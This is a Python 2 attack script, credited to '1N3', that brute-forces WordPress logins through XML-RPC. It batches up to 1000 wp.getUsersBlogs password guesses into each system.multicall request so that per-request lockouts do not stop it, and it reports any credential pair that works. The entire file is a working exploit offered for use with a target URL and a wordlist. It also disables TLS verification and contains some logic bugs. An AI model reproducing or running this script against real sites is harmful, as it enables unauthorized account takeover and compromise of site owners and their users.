#!/usr/bin/python
# Wordpress XML-RPC Brute Force Amplification Exploit by 1N3
# Last Updated: 20160617
# https://crowdshield.com
#
# ABOUT: This exploit launches a brute force amplification attack on target Wordpress sites. Since XMLRPC allows multiple auth calls per request, amplification is possible and standard brute force protection will not block the attack.
#
# USAGE: ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username
#


import urllib, urllib2, sys, getopt, requests, ssl
from array import *

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def main(argv):
	argc = len(argv)

	if argc < 3:

		print bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC
		print bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC
		print bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC
		print bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC
		print bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC
		print bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC
		print bcolors.OKBLUE + "" + bcolors.ENDC
		print bcolors.OKBLUE + "		\ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC
		print bcolors.OKBLUE + "		 X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC
		print bcolors.OKBLUE + '		/ \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC
		print bcolors.OKBLUE + "" + bcolors.ENDC
		print ""
		print bcolors.OKBLUE + "+ -- --=[XML-RPC Brute Force Exploit by 1N3 @ https://crowdshield.com" + bcolors.ENDC
        	print bcolors.OKBLUE + "+ -- --=[Usage: %s http://wordpress.org/xmlrpc.php passwords.txt username" % (argv[0]) + bcolors.ENDC
        	sys.exit(0)

	url = argv[1] # SET TARGET
	wordlist = argv[2] # SET CUSTOM WORDLIST
	users = argv[3] # SET USERNAME TO BRUTE FORCE
	# users = ['flipkey'] # USERS LIST, ADD MORE AS NEEDED OR CHANGE DEFAULT ADMIN
	
	print bcolors.OKBLUE + "" + bcolors.ENDC
	print bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC
	print bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC
	print bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC
	print bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC
	print bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC
	print bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC
	print bcolors.OKBLUE + "" + bcolors.ENDC
	print bcolors.OKBLUE + "		\ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC
	print bcolors.OKBLUE + "		 X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC
	print bcolors.OKBLUE + '		/ \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC
	print bcolors.OKBLUE + "" + bcolors.ENDC
	print ""
	print bcolors.OKBLUE + "+ -- --=[XML-RPC Brute Force Exploit by 1N3 @ https://crowdshield.com" + bcolors.ENDC
	print bcolors.WARNING + "+ -- --=[Brute forcing target: " + url + " with username: " + users + "" + bcolors.ENDC

	data1 = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
	data2 = ""
	data3 = '</data></array></value></param></params></methodCall>'

	num_lines = sum(1 for line in open(wordlist))
	f = open(wordlist)
	lines = f.readlines()
	passwds = f.read().splitlines()
	f.close()

	num = 0 # CURRENT LINE POSITION
	count = 0 # HOW MANY AUTHS TO SEND PER REQUEST

	while num < num_lines:
		# SEND 50 AUTH REQUESTS PER REQUEST
		if count < 1000:
			num += 1
			count += 1

			# REACHED END OF FILE, SEND REQUEST AND ATTEMPT BRUTE FORCE...
			if num >= num_lines:
				data = "" + data1 + "" + data2 + "" + data3
				header = 'headers={"Content-Type": "application/xml"}'
				req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
				rsp = urllib2.urlopen(req,context=ctx)
				content = rsp.read()
				print content

				if "admin" in content.lower():
					print bcolors.OKGREEN + "+ -- --=[Brute Force Amplification Attack Successful!" + bcolors.ENDC
					print bcolors.WARNING + "+ -- --=[Starting Brute Force Enumeration..." + bcolors.ENDC

					for user in users:
						while num <= num_lines:
							num -= 1
							passwd = str(lines[num])
							data = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>' + user + '</value></param><param><value>' + passwd + '</value></param></params></methodCall>'
							header = 'headers={"Content-Type": "application/xml"}'
							req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
							rsp = urllib2.urlopen(req,context=ctx)
							content = rsp.read()
							print content

							if "incorrect" in content.lower():
								print bcolors.FAIL + "+ -- --=[Wrong username or password: " + user + "/" + passwd + "" + bcolors.ENDC
							elif "admin" in content.lower():
								print bcolors.OKGREEN + "+ -- --=[w00t! User found! Wordpress is pwned! " + user + "/" + passwd + "" + bcolors.ENDC
								sys.exit(0)
							else:
								print bcolors.WARNING + "+ -- --=[Invalid response from target" + bcolors.ENDC
								sys.exit(0)
				else:
					print bcolors.FAIL + "+ -- --=[Brute force failed" + bcolors.ENDC

				break
				sys.exit(0)
			else:
				passwd = str(lines[num])
				for user in users:
					data2 += str('<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>'+user+'</string></value><value><string>'+passwd+'</string></value></data></array></value></data></array></value></member></struct></value>')
		
		# WE'VE REACHED THE LIMIT, SEND THE REQUEST AND RESET COUNTER
		else:
			count = 0
			data = "" + data1 + "" + data2 + "" + data3
			header = 'headers={"Content-Type": "application/xml"}'
			req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
			rsp = urllib2.urlopen(req,context=ctx)
			content = rsp.read()
			print content
			data2 = ""

			if "admin" in content.lower():
				print bcolors.OKGREEN + "+ -- --=[Brute Force Amplification Attack Successful!" + bcolors.ENDC
				print bcolors.WARNING + "+ -- --=[Starting Brute Force Enumeration..." + bcolors.ENDC

				for user in users:
					while num <= num_lines:
						passwd = str(lines[num])
						data = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>' + user + '</value></param><param><value>' + passwd + '</value></param></params></methodCall>'
						header = 'headers={"Content-Type": "application/xml"}'
						req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
						rsp = urllib2.urlopen(req,context=ctx)
						content = rsp.read()
						num -= 1
						print content

						if "incorrect" in content.lower():
							print bcolors.FAIL + "+ -- --=[Wrong username or password: " + user + "/" + passwd + "" + bcolors.ENDC
						elif "admin" in content.lower():
							print bcolors.OKGREEN + "+ -- --=[w00t! User found! Wordpress is pwned! " + user + "/" + passwd + "" + bcolors.ENDC
							sys.exit(0)
						else:
							print bcolors.WARNING + "+ -- --=[Invalid response from target" + bcolors.ENDC
							sys.exit(0)
			else:
				print bcolors.FAIL + "+ -- --=[Brute force failed" + bcolors.ENDC

main(sys.argv)
